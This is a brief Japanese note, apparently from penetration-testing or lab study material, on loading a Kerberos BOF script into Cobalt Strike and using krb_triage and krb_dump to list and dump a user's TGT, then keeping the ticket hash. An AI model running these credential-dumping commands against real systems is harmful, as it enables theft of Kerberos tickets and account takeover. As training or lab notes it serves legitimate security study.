## BOF利用
ロード方法：
左上CobaltStrike -> Script Manager -> Load -> ファイルを選択
選択するファイル
```
C:\Tools\Kerberos-BOF\kerbeus_cs.cna
```

チケット一覧表示
```
krb_triage
```

チケットのダンプ(TGT)
```
krb_dump /user:rsteel /service:krbtgt
```

チケットのハッシュをコピーしておく